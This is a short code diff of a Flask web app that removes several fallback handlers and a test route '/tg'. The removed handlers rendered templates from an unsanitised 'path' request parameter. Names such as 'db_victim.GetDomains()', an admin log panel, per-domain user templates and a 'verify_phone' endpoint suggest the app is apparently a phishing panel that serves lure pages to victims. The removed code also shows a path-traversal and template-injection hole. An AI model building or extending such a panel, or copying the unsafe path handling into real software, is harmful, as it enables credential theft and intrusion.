@@ -141,15 +141,7 @@ def login():
                 # Если нет сессии
                 return render_template('login.html')
     else:
-        try:
-            path = request.args.get('path', None)
-            url = domain + '$' + request.path.replace('/', '')
-            if path:
-                url = domain + '$' + path
-            username = os.listdir(f'templates/domains/{url}/')[0]
-            return render_template(f'domains/{url}/{username}')
-        except:
-            return redirect(url_for('index', path=request.path.replace('/', '')))
+        return redirect(url_for('index', path=request.path.replace('/', '')))
     
 
 
@@ -189,15 +181,7 @@ def panel():
 
         return render_template('index.html', username=username, admin=admin, logs=logs)
     else:
-        try:
-            path = request.args.get('path', None)
-            url = domain + '$' + request.path.replace('/', '')
-            if path:
-                url = domain + '$' + path
-            username = os.listdir(f'templates/domains/{url}/')[0]
-            return render_template(f'domains/{url}/{username}')
-        except:
-            return redirect(url_for('index', path=request.path.replace('/', '')))
+        return redirect(url_for('index', path=request.path.replace('/', '')))
     
 
 
@@ -320,14 +304,7 @@ def domains():
         domains = db_victim.GetDomains()
         return render_template('domains.html', domains=domains)
     else:
-        try:
-            path = request.args.get('path', None)
-            url = domain + '$' + path
-            username = os.listdir(f'templates/domains/{url}/')[0]
-            return render_template(f'domains/{url}/{username}')
-        except Exception as e:
-            print(e)
-            return redirect(url_for('index', path=request.path.replace('/', '')))
+        return redirect(url_for('index', path=request.path.replace('/', '')))
 
 
 
@@ -520,23 +497,6 @@ def verify_phone():
 
     return jsonify({'status': 'error', 'phone': phone, 'domain': domain})
     
-
-
-
-
-
-
-
-###########################################
-#                                         #
-#               Тестирование              #
-#                                         #
-###########################################
-@app.route('/tg', methods=['POST', 'GET'])
-def tg():
-    return render_template('domains/jojo.html')
-
-
 
 
 
